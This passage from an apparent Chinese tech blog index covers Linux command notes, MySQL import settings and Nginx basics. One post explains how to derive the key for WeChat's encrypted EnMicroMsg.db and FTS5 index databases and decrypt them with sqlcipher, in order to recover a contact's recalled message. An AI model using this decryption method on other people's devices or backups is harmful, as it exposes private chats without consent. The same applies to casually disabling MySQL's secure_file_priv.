-</code>会切换成<code>root</code>用户，并切换到<code>root</code>用户默认的登录位置（<code>\\root</code>）。</p>\n<h2 id=\"echo\"><a href=\"#echo\" class=\"headerlink\" title=\"echo\"></a>echo</h2><p><code>echo</code>默认输出换行，如果想输出不换行，用<code>echo -n</code>。例：<code>echo 123; echo 456</code>输出：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">123</span><br><span class=\"line\">456</span><br></pre></td></tr></table></figure><br>而用<code>echo -n 123; echo 456</code>输出：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">123456</span><br></pre></td></tr></table></figure><br><code>echo -e</code>表示转义输出。</p>\n<h2 id=\"more\"><a href=\"#more\" class=\"headerlink\" title=\"more\"></a>more</h2><p><code>more &lt;filename&gt;</code>可以弥补<code>cat</code>一次读入大文件大量占用内存的问题。<code>more</code>可以展示文件一部分内容，用<code>Enter</code>翻页，<code>q</code>退出。<code>more</code>可以指定每页行数和从哪一行开始读，例如：从第3行开始读，每页展示10行：<code>more -3 +10 &lt;filename&gt;</code>。</p>\n<h2 id=\"head-tail\"><a href=\"#head-tail\" class=\"headerlink\" title=\"head/tail\"></a>head/tail</h2><p><code>head</code>和<code>tail</code>用于查看文件的前几行和后几行，默认展示10行。<code>-n</code>可以指定展示行数，例如：展示文件前20行：<code>head -n 10 &lt;filename&gt;</code>。</p>\n<p><code>tail -f &lt;filename&gt;</code>可以监控文件变化，可以用于实时监控日志。</p>\n<h2 id=\"du\"><a href=\"#du\" class=\"headerlink\" title=\"du\"></a>du</h2><p><code>du</code>（disk usage）命令用于显示目录或文件的大小。<code>-h</code>可以优化展示结果，一般都会加上。<code>-d</code>指定深度。如分析<code>/var</code>下文件大小：<code>cd /var; sudo du -h -d 1</code>，输出各个文件夹大小：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0       ./backups</span><br><span class=\"line\">1.1G    ./cache</span><br><span class=\"line\">472K    ./crash</span><br><span class=\"line\">850M    ./lib</span><br><span class=\"line\">0       ./local</span><br><span class=\"line\">2.0M    ./log</span><br><span class=\"line\">0       ./mail</span><br><span class=\"line\">0       ./opt</span><br><span class=\"line\">0       ./snap</span><br><span class=\"line\">0       ./spool</span><br><span class=\"line\">0       ./tmp</span><br><span class=\"line\">12K     ./www</span><br><span class=\"line\">1.9G    .</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"xargs\"><a href=\"#xargs\" class=\"headerlink\" title=\"xargs\"></a>xargs</h2><p><code>xargs</code>可以把管道的输出根据换行或者空格拆分成多个参数，提供给其他命令执行。<br>例如：<code>echo &quot;1.txt 2.txt 3.txt&quot; | xargs -t touch</code>会创建三个文件，<code>-t</code>表示输出执行结果，在执行创建文件前，控制台会打印出<code>touch 1.txt 2.txt 3.txt</code>。可以用<code>-n</code>指定每次传递的参数数量，例如：<code>$ ls | xargs -t -n1 rm</code>，每次只传1个参数，相当于调用了3次<code>rm</code>命令。控制台打出：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">rm 1.txt </span><br><span class=\"line\">rm 2.txt </span><br><span class=\"line\">rm 3.txt </span><br></pre></td></tr></table></figure><br>如果要执行多个命令，可以用<code>-I</code>或者<code>-i</code>，用<code>%</code>作为参数占位符，例如：<code>echo &quot;1.txt 2.txt 3.txt&quot; | xargs -t -I % sh -c &quot;touch %; ls -l %&quot;</code>，输出：<code>sh -c &#39;touch 1.txt 2.txt 3.txt; ls -l 1.txt 2.txt 3.txt&#39;</code>，创建了3个文件，并打印出文件信息。</p>\n<p>之前的参数分割符是换行符或者空格，也可以指定分隔符。使用<code>-d</code>或者<code>--delimiter</code>选项设置自定义分隔符，可以是单个字符，也可以是以<code>\\</code>开头的转义字符。例：<code>echo -n 1.txt#2.txt#3.txt | xargs -d \\# -t rm</code>。</p>\n<p><code>xargs</code>还支持直接从文件读取输入。先准备一份域名列表文件<code>domains.txt</code>:<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ cat &gt; domains.txt &lt;&lt; <span class=\"string\">&quot;EOF&quot;</span></span><br><span class=\"line\">heredoc&gt; www.whoisnian.com</span><br><span class=\"line\">heredoc&gt; www.github.com</span><br><span class=\"line\">heredoc&gt; www.baidu.com</span><br><span class=\"line\">heredoc&gt; EOF</span><br></pre></td></tr></table></figure><br>接下来<code>xargs -a domains.txt -t -L 1 ping -c 1</code>，用<code>-a</code>指定文件，<code>-L</code>指定每次读入的行数，这句命令将对每行的域名执行<code>ping -c 1</code>：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ping -c 1 www.whoisnian.com </span><br><span class=\"line\">PING www.whoisnian.com (45.77.145.72) 56(84) bytes of data.</span><br><span class=\"line\">64 bytes from 45.77.145.72: icmp_seq=1 ttl=48 time=266 ms</span><br><span class=\"line\"></span><br><span class=\"line\">--- www.whoisnian.com ping statistics ---</span><br><span class=\"line\">1 packets transmitted, 1 received, 0% packet loss, time 0ms</span><br><span class=\"line\">rtt min/avg/max/mdev = 266.012/266.012/266.012/0.000 ms</span><br><span class=\"line\">ping -c 1 www.github.com </span><br><span class=\"line\">PING github.com (192.30.255.113) 56(84) bytes of data.</span><br><span class=\"line\">64 bytes from lb-192-30-255-113-sea.github.com (192.30.255.113): icmp_seq=1 ttl=48 time=174 ms</span><br><span class=\"line\"></span><br><span class=\"line\">--- github.com ping statistics ---</span><br><span class=\"line\">1 packets transmitted, 1 received, 0% packet loss, time 0ms</span><br><span class=\"line\">rtt min/avg/max/mdev = 174.455/174.455/174.455/0.000 ms</span><br><span class=\"line\">ping -c 1 www.baidu.com </span><br><span class=\"line\">PING www.a.shifen.com (36.152.44.96) 56(84) bytes of data.</span><br><span class=\"line\">64 bytes from 36.152.44.96 (36.152.44.96): icmp_seq=1 ttl=58 time=4.47 ms</span><br><span class=\"line\"></span><br><span class=\"line\">--- www.a.shifen.com ping statistics ---</span><br><span class=\"line\">1 packets transmitted, 1 received, 0% packet loss, time 0ms</span><br><span class=\"line\">rtt min/avg/max/mdev = 4.469/4.469/4.469/0.000 ms</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"grep\"><a href=\"#grep\" class=\"headerlink\" title=\"grep\"></a>grep</h2><p><code>grep</code>（Globally search a Regular Expression and Print）用于用正则过滤文本。常接在管道后：<code>cat server.log | grep &quot;Error&quot;</code>。</p>\n<p><code>grep</code>也可直接以文件作参数，从文件中读取目标信息。上述写法等同于<code>grep &quot;Error&quot; server.log</code>。使用<code>-n</code>可以展示行号。如果日志文件分散在多个文件里，还可以用文件通配符：<code>grep &quot;Error&quot; -n *.log</code>。如果日志文件分散在多层目录里，要用<code>-rn</code>来递归遍历。查看日志报错一般还需要观察错误日志的上下文，<code>-A &lt;num1&gt; -B &lt;num2&gt;</code>用于输出目标行的上下几行，<code>-A</code>是After，<code>-B</code>是Before，比如查看”IOException”的上下10行：<code>find . -maxdepth 3 -name &quot;*.log&quot; -print0 | xargs -0 grep -n &quot;IOException&quot; -A 10 -B 10 *.log</code>。</p>\n<h2 id=\"find\"><a href=\"#find\" class=\"headerlink\" title=\"find\"></a>find</h2><p>根据文件名查询，一般用法：<code>find &lt;path&gt; -name &lt;filename&gt;</code><br>在<code>/home</code>下查找<code>1.txt</code>文件可以用<code>find /home -name 1.txt</code>，如果用通配符查询，需要用引号把pattern括起来：<code>find /home -name &quot;*.txt&quot;</code>，输出：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">./1.txt</span><br><span class=\"line\">./2.txt</span><br><span class=\"line\">./3.txt</span><br></pre></td></tr></table></figure><br>一般把<code>find</code>和<code>xargs</code>连用，查看文件详细信息：<code>find . -name &quot;*.txt&quot; -print0 | xargs -0  ls -l</code>，这里的<code>-print0</code>是把输出用<code>NULL</code>连接取代原来的换行，由<code>xargs -0</code>指定用<code>NULL</code>作为分隔符。</p>\n<p>根据大小查询，一般用法：<code>find &lt;path&gt; -size [+/-]&lt;size&gt;</code>。例如查询当前目录大于10M的文件：<code>find . -size +10M -print0 | xargs -0 ls -l</code><br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">-rw-r--r-- 1 thankod thankod 17789538 Dec  7 19:09 ./hello-rust/target/debug/deps/libclap-e118728b5a2a90f4.rlib</span><br><span class=\"line\">-rw-r--r-- 1 thankod thankod 11786802 Dec  7 16:32 ./hello-rust/target/debug/deps/libobject-6d4de7c5be0727d4.rlib</span><br><span class=\"line\">-r--r--r-- 1 thankod thankod 15766524 Dec 22 16:24 ./rust-lua/.git/objects/pack/pack-a3621f69371ce8cea6964696d69d5004e665eb90.pack</span><br></pre></td></tr></table></figure><br><code>find</code>查询的默认包含文件夹和文件，如果只查询文件夹，可以用<code>-type d</code>，只查找文件<code>-type f</code>。</p>\n<p>根据时间查询，一般用法<code>find &lt;path&gt; -[c/m/a][time/min] [+/-]&lt;day&gt;</code>。其中例如<code>c</code>是修改（Change）（修改文件包括权限），<code>m</code>是（Modify）（修改文件内容），<code>a</code>是（Access）（访问文件内容）。<code>time</code>和<code>min</code>表示天/分钟。例如：查询1天内修改的文件：<code>find . -ctime -1</code>，刚好1天修改的文件：<code>find . -ctime +1</code>，1天前修改的文件：<code>find . -ctime -1</code>。</p>\n<p><code>-maxdepth</code>可以指定文件的深度。比如：查询10天前修改的当前目录深度2的大小小于1M的<code>js</code>文件：<code>find . -maxdepth 2 -name &quot;*.js&quot; -ctime -10 -type f -size -1M</code></p>\n<h2 id=\"重定向符\"><a href=\"#重定向符\" class=\"headerlink\" title=\"重定向符\"></a>重定向符</h2><p><code>&gt;</code>和<code>&gt;&gt;</code>可以用于将命令输出重定向到文件中，区别是<code>&gt;</code>是覆盖写入，而<code>&gt;&gt;</code>是追加写入。<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> -n HelloWorld &gt; hello.txt <span class=\"comment\"># HelloWord</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> Linux &gt;&gt; hello.txt <span class=\"comment\"># HelloWorldLinux</span></span><br></pre></td></tr></table></figure><br>而<code>&lt;</code>表示将文件作为命令的标准输入，<code>&lt;&lt;</code>表示从标准输入中读入，直到遇到分界符停止。例：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ cat &gt; hello.txt &lt;&lt; <span class=\"string\">&quot;EOF&quot;</span>                                          130 ↵</span><br><span class=\"line\">heredoc&gt; hello </span><br><span class=\"line\">heredoc&gt; world</span><br><span class=\"line\">heredoc&gt; EOF</span><br><span class=\"line\">$ cat hello.txt</span><br><span class=\"line\">hello</span><br><span class=\"line\">world</span><br></pre></td></tr></table></figure><br>这种写法可以不用vim而快速向文件写入多行。</p>\n<blockquote>\n<p>参考资料：</p>\n<ul>\n<li><a href=\"https://blog.csdn.net/weixin_34314962/article/details/86358466\">zsh和bash对比</a></li>\n</ul>\n</blockquote>\n","tags":["Linux"]},{"title":"MIUI微信8.0数据导出","url":"/2021/10/07/MIUI%E5%BE%AE%E4%BF%A18-0%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%87%BA/","content":"<blockquote>\n<p>多年不再联系的朋友X偶然加了我微信，发了一条消息后又撤回了，很想知道她发了什么但又不好意思问，于是打算从微信的本地数据库找点线索。</p>\n</blockquote>\n<p>手机是红米K30 Pro(MIUI 12.5)，微信版本8.0。由于手机没有Root，不能用ADB直接拿到数据，所以用MIUI的备份功能备份微信。</p>\n<p><img src=\"1.jpg\" alt=\"\"></p>\n<p>只单独备份微信一个APP，USB链接后在<code>MIUI/backup/ALlBackup</code>中拿到微信的备份包，可以用7zip打开并导出<code>apps</code>文件夹。</p>\n<p>微信数据一般存放于SQlite的<code>db</code>文件中，搜索<code>*.db</code>文件可以发现<code>apps/com.tencent.mm/r/MicroMsg/ee1da3ae2100e09165c2e52382cfe79f</code>下有个挺大的<code>EnMicroMsg.db</code>文件，应该就是它了。对于有多个登录帐号的手机，每个账号对应一个<code>apps/com.tencent.mm/r/MicroMsg/&#123;你的帐号的hash&#125;</code>文件夹，里面存放数据库和一些资源文件。</p>\n<span id=\"more\"></span>\n<p>拿到<code>EnMicroMsg.db</code>后用WinHex查看了一下，没有看到SQLite Header，果然是加密的。查阅资料得知<code>EnMicroMsg.db</code>的密钥生成规则是：<strong>对IMEI拼接uin再取32的MD5值，取前7个小写字符</strong></p>\n<p>部分手机IEMI可以通过在电话中输入<code>*#6#</code>获得（我的手机Android版本是11，APP不能获取到手机的IMEI，对于获取不到IMEI的情况，使用<code>1234567890ABCDEF</code>替代）</p>\n<p>uin可以在<code>apps/com.tencent.mm/sp/system_config_prefs.xml</code>中获得：<br><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27; standalone=&#x27;yes&#x27; ?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">map</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">boolean</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;set_service&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;true&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">boolean</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;first_launch_weixin&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;false&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">int</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;appbrand_video_player&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;-1&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">int</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;default_uin&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1234323232&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">int</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;launch_last_status&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;2&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">string</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;support.weixin.qq.com&quot;</span>&gt;</span>support.weixin.qq.com<span class=\"tag\">&lt;/<span class=\"name\">string</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">string</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;builtin_short_ips&quot;</span>&gt;</span>6,117.184.242.101,80,short.weixin.qq.com|6,117.184.242.100,80,short.weixin.qq.com|9,223.166.152.100,80,short.weixin.qq.com|9,223.166.152.101,80,short.weixin.qq.com|17,11.89.15.100,80,short.weixin.qq.com|17,101.89.15.101,80,short.weixin.qq.com|6,117.184.242.101,80,extshort.weixin.qq.com|5,117.184.242.100,80,extshort.weixin.qq.com|17,101.89.15.100,80,extshort.weixin.qq.com|17,101.89.15.101,80,extshort.weixin.qq.com|9,223.166.152.101,80,extshort.weixin.qq.com|9,223.16.152.100,80,extshort.weixin.qq.com|6,120.204.10.51,80,short.pay.weixin.qq.com|6,183.192.199.145,80,short.pay.weixin.qq.com|9,223.167.104.142,80,short.pay.weixin.qq.com|9,58.247.204.143,80,short.pay.weixin.qq.com|17,101.226.211.100,80,short.pay.weixin.qq.com|17,180.163.25.142,80,short.pay.weixin.qq.com|17,127.0.0.1,80,localhost|<span class=\"tag\">&lt;/<span class=\"name\">string</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">map</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>其中<code>default_uin</code>对应的<code>1234323232</code>就是uin。有了IMEI和uin就可以计算出解密的key了，Python代码表示如下：<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\">key = hashlib.md5(<span class=\"built_in\">str</span>(imei).encode(<span class=\"string\">&quot;utf8&quot;</span>) + <span class=\"built_in\">str</span>(uin).encode(<span class=\"string\">&quot;utf8&quot;</span>)).hexdigest()[<span class=\"number\">0</span>:<span class=\"number\">7</span>]</span><br></pre></td></tr></table></figure></p>\n<p>微信的db使用了<code>sqlcipher</code>加密，ubuntu下用<code>apt install sqlcipher</code>安装<code>sqlcipher</code>，之后命令行下<code>sqlcipher</code>进入交互shell，用刚才得到的key将数据库解密成<code>EnMicroMsg-decrypted.db</code>：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">PRAGMA key <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxxxxxx&#x27;</span>;</span><br><span class=\"line\">PRAGMA cipher_use_hmac <span class=\"operator\">=</span> OFF;</span><br><span class=\"line\">PRAGMA cipher_page_size <span class=\"operator\">=</span> <span class=\"number\">1024</span>;</span><br><span class=\"line\">PRAGMA kdf_iter <span class=\"operator\">=</span> <span class=\"number\">4000</span>;</span><br><span class=\"line\">ATTACH DATABASE <span class=\"string\">&#x27;EnMicroMsg-decrypted.db&#x27;</span> <span class=\"keyword\">AS</span> wechatdecrypted KEY <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> sqlcipher_export( <span class=\"string\">&#x27;wechatdecrypted&#x27;</span> );</span><br><span class=\"line\">DETACH DATABASE wechatdecrypted;</span><br></pre></td></tr></table></figure>\n<p>此时数据库已经能直接查看了：<img src=\"2.png\" alt=\"\"></p>\n<p>查看SQLite的工具可以是付费的navicat，也可用开源的SQLite Browser。在<code>rcontact</code>表中用昵称找到X的微信号<br><img src=\"4.png\" alt=\"\"></p>\n<p>再在<code>message</code>表中过滤，只查到两条相关记录：<br><img src=\"3.png\" alt=\"\"></p>\n<p>很可惜，微信的撤回功能直接用一串文字替换了原来的信息，并非我预想的改变了某个标记位。</p>\n<p>再次查阅了相关资料，据说<code>FTS5IndexMicroMsg_encrypt.db</code>中存放了索引，<code>EnMicroMsg.db</code>每产生一个聊天就会在<code>FTS5IndexMicroMsg_encrypt.db</code>中创建一个索引，可以尝试用它找到撤回前的内容。查阅资料得知<code>FTS5IndexMicroMsg_encrypt</code>的加密规则是：<strong>uin，IMEI，微信号拼接求32位md5值，取小写前7个字符</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">key = hashlib.md5(<span class=\"built_in\">str</span>(uin).encode(<span class=\"string\">&quot;utf8&quot;</span>) + <span class=\"built_in\">str</span>(imei).encode(<span class=\"string\">&quot;utf8&quot;</span>) + <span class=\"built_in\">str</span>(account).encode(<span class=\"string\">&quot;utf8&quot;</span>)).hexdigest()[<span class=\"number\">0</span>:<span class=\"number\">7</span>]</span><br></pre></td></tr></table></figure>\n<p>对于<code>FTS5IndexMicroMsg_encrypt.db</code>的解密还需要需要修改之前几个参数：<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">PRAGMA key <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxxxxxx&#x27;</span></span><br><span class=\"line\">PRAGMA cipher <span class=\"operator\">=</span> <span class=\"string\">&#x27;aes-256-cbc&#x27;</span>;</span><br><span class=\"line\">PRAGMA cipher_use_hmac <span class=\"operator\">=</span> <span class=\"keyword\">ON</span>;</span><br><span class=\"line\">PRAGMA cipher_page_size <span class=\"operator\">=</span> <span class=\"number\">4096</span>;</span><br><span class=\"line\">PRAGMA kdf_iter <span class=\"operator\">=</span> <span class=\"number\">64000</span>;</span><br><span class=\"line\">ATTACH DATABASE <span class=\"string\">&#x27;FTS5IndexMicroMsg_decrypt.db&#x27;</span> <span class=\"keyword\">AS</span> fts5indexdecrypt KEY <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> sqlcipher_export( <span class=\"string\">&#x27;fts5indexdecrypt&#x27;</span> );</span><br><span class=\"line\">DETACH DATABASE fts5indexdecrypt;</span><br></pre></td></tr></table></figure></p>\n<p>打开解密后的索引数据库，可以看到聊天内容被单独存放在<code>FTSIndexMessage_content</code>中<br><img src=\"5.png\" alt=\"\"></p>\n<p>据说<code>FTSIndexMessage_content</code>中的数据会随着删除/消息撤回也同步删除，但不同于<code>EnMicroMsg.db</code>中的数据会写0覆盖，<code>FTS5IndexMicroMsg_encrypt.db</code>中的数据可以被恢复。<br>但用几个恢复SQLite数据的软件都没能找到疑似的信息，二进制编辑器中也没发现什么线索。</p>\n<p>大失败，折腾好久仍未知道X说了什么。</p>\n<p><img src=\"6.webp\" alt=\"\"></p>\n<p>或许是微信8.0后索引表也有了删除写0覆盖，总是先留着吧，万一有一天解出来了呢。</p>\n<p>最后说一下遇到的几个坑：</p>\n<ol>\n<li><p>之前在ArchLinux上用<code>pacman</code>安装<code>sqlcipher</code>版本是最新的4.4.3，但是该版本下无法解密任何微信db，在某个issue里看到4以上的版本似乎采用了新的加密方式。之后使用WSL Ubuntu 20.04的<code>apt</code>安装<code>sqlcipher</code>得到了3.16的版本，可以对两个db都成功解密。</p>\n</li>\n<li><p>一些教程提到的Windows下的<code>sqlcipher.exe</code>的GUI程序实际上是修改了几个<code>PRAGMA</code>的SQLBrowser，只能解密<code>EnMicroMsg.db</code>，而<code>FTS5IndexMicroMsg-encrypt</code>需要不同的参数，无法解密。</p>\n</li>\n</ol>\n<blockquote>\n<p>参考资料</p>\n<ul>\n<li><a href=\"https://www.forensicfocus.com/articles/decrypt-wechat-enmicromsgdb-database/\">How To Decrypt WeChat EnMicroMsg.db Database?</a></li>\n<li><a href=\"https://github.com/cos0sin0/MicroMsgRecovery\">MicroMsgRecovery</a></li>\n</ul>\n</blockquote>\n","tags":["Andriod"]},{"title":"MySQL数据导入的常用方式","url":"/2021/03/15/MySQL%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E7%9A%84%E5%B8%B8%E7%94%A8%E6%96%B9%E5%BC%8F/","content":"<blockquote>\n<p>环境：MySQL 5.7</p>\n</blockquote>\n<h2 id=\"LOAD-DATA-INFILE\"><a href=\"#LOAD-DATA-INFILE\" class=\"headerlink\" title=\"LOAD DATA INFILE\"></a>LOAD DATA INFILE</h2><p>MySQL的<code>LOAD DATA INFILE</code>可以快速导入各种格式化的数据。现有位置数据需要导入：<br><img src=\"1.png\" alt=\"\"><br>数据为一般文本，位于<code>/root/d_dt_region</code>，以<code>&quot;,&quot;</code>分割列，以<code>&quot;</code>包裹字段。执行<code>mysql -uroot -p</code>进入MySQL Shell，使用以下命令：<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">LOAD DATA INFILE &quot;/root/t_dt_region.csv&quot; </span><br><span class=\"line\"><span class=\"keyword\">INTO</span> <span class=\"keyword\">TABLE</span> t_dt_region </span><br><span class=\"line\">FIELDS TERMINATED <span class=\"keyword\">BY</span> &quot;,&quot; ENCLOSED <span class=\"keyword\">BY</span> &quot;\\&quot;&quot; </span><br><span class=\"line\">LINES TERMINATED BY &quot;\\r\\n&quot; </span><br><span class=\"line\">(ID,PARENT_ID,NAME,SHORT_NAME,LONGITUDE,LATITUDE,LEVEL,SORT,STATUS);</span><br></pre></td></tr></table></figure></p>\n<span id=\"more\"></span>\n<h3 id=\"异常处理\"><a href=\"#异常处理\" class=\"headerlink\" title=\"异常处理\"></a>异常处理</h3><h4 id=\"secure-file-priv设置\"><a href=\"#secure-file-priv设置\" class=\"headerlink\" title=\"secure-file-priv设置\"></a>secure-file-priv设置</h4><p>报错如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br></pre></td></tr></table></figure><br>报错原因：<strong>MySQL文件的导入和导出路径有默认的设置，即<code>secure-file-priv</code>，当传入的csv文件路径与默认的路径冲突时就会报错。</strong></p>\n<p><code>secure-file-priv</code>的值可以在<code>/etc/my.cnf</code>中配置，有三种情况：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">secure_file_priv=null ––限制mysqld不允许导入导出</span><br><span class=\"line\">secure_file_priv=/path/ --限制mysqld的导入导出只能发生在默认的/path/目录下</span><br><span class=\"line\">secure_file_priv=&#x27;&#x27; --不对mysqld的导入导出做限制</span><br></pre></td></tr></table></figure><br>可以使用<code>SHOW VARIABLES LIKE &quot;%secure%&quot;</code>查看当前的<code>secure-file-priv</code>，<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">+--------------------------+-----------------------+</span><br><span class=\"line\">| Variable_name            | Value                 |</span><br><span class=\"line\">+--------------------------+-----------------------+</span><br><span class=\"line\">| require_secure_transport | OFF                   |</span><br><span class=\"line\">| secure_auth              | ON                    |</span><br><span class=\"line\">| secure_file_priv         | /var/lib/mysql-files/ |</span><br><span class=\"line\">+--------------------------+-----------------------+</span><br></pre></td></tr></table></figure><br>可以看到默认目录为<code>/var/lib/mysql-files/</code>。可以将csv文件移动到该目录下，也可修改<code>/etc/my.cnf</code>配置：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[mysqld]</span><br><span class=\"line\">secure-file-priv=&#x27;&#x27;</span><br></pre></td></tr></table></figure><br>修改后重启MySQL，再次查看<code>SHOW VARIABLES LIKE &quot;%secure%&quot;</code>，看到<code>secure_file_priv</code>字段修改为空，此时已经可以从其他目录导入数据了。</p>\n<h4 id=\"max-allowed-packet设置\"><a href=\"#max-allowed-packet设置\" class=\"headerlink\" title=\"max_allowed_packet设置\"></a>max_allowed_packet设置</h4><p>报错如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Packet for query is too large (1139736&gt; 1048576). You can change this value on the server by setting</span><br></pre></td></tr></table></figure><br>如果csv文件过大，还需要调大<code>/etc/my.cnf</code>中的<code>max_allowed_packet</code>字段：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[mysqld]</span><br><span class=\"line\">max_allowed_packet=256M</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"行分隔符错误\"><a href=\"#行分隔符错误\" class=\"headerlink\" title=\"行分隔符错误\"></a>行分隔符错误</h4><p>报错如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Data truncated for column &#x27;xxx&#x27; at row 1</span><br></pre></td></tr></table></figure><br>检查<code>LINES TERMINATED BY &quot;\\r\\n&quot;</code>语句，如果写成<code>LINES TERMINATED BY &quot;\\n&quot;</code>可能会出现这种问题</p>\n","tags":["MySQL"]},{"title":"Nginx学习笔记","url":"/2019/05/04/Nginx%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"<h2 id=\"基本选项\"><a href=\"#基本选项\" class=\"headerlink\" title=\"基本选项\"></a>基本选项</h2><p><code>nginx -h</code>打印出的内容几乎已经告诉我们如何使用nginx：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Options:</span><br><span class=\"line\">  -?,-h         : this help</span><br><span class=\"line\">  -v            : show version and exit</span><br><span class=\"line\">  -V            : show version and configure options then exit</span><br><span class=\"line\">  -t            : test configuration and exit</span><br><span class=\"line\">  -T            : test configuration, dump it and exit</span><br><span class=\"line\">  -q            : suppress non-error messages during configuration testing</span><br><span class=\"line\">  -s signal     : send signal to a master process: stop, quit, reopen, reload</span><br><span class=\"line\">  -p prefix     : set prefix path (default: /usr/local/nginx/)</span><br><span class=\"line\">  -c filename   : set configuration file (default: /usr/local/nginx/nginx.conf)</span><br><span class=\"line\">  -g directives : set global directives out of configuration file</span><br></pre></td></tr></table></figure></p>\n<span id=\"more\"></span>\n<h2 id=\"工作模式\"><a href=\"#工作模式\" class=\"headerlink\" title=\"工作模式\"></a>工作模式</h2><p>使用<code>ps -ef | grep nginx</code>查看nginx的进程：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">root     19997     1  0 14:02 ?        00:00:00 nginx: mas</span><br><span class=\"line\">nobody   19998 19997  0 14:02 ?        00:00:00 nginx: wor</span><br><span class=\"line\">tedis    20195 19881  0 14:05 tty3     00:00:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox nginx</span><br></pre></td></tr></table></figure><br><code>m</code>和<code>w</code>分别是<code>master process</code>和<code>worker process</code>。nginx采用一主多从，主进程读取和评估配置，维护工作进程。工作进程处理请求。</p>\n<h2 id=\"配置文件\"><a href=\"#配置文件\" class=\"headerlink\" title=\"配置文件\"></a>配置文件</h2><p>编译阶段用<code>./configure --conf-path=PATH</code>可以指定nginx的默认配置路径，如果编译后想指定用某个配置文件启动，可以用<code>nginx -t path/to/nginx.config</code>启动，不加改参数则使用默认的配置文件路径</p>\n<p>使用<code>nginx -t</code>可以检测配置文件的合法性，使用<code>nginx -c -t</code>可以检测某个特定配置文件的合法性，可以在启动nginx之前使用此命令测试一次。</p>\n<p><code>nginx.conf</code>是主配置文件，所有的时候启动都会被用到，而安装目录下的<code>conf</code>文件夹中还有辅助配置文件，他们只有在部分条件先被调用。</p>\n<h3 id=\"nginx-conf\"><a href=\"#nginx-conf\" class=\"headerlink\" 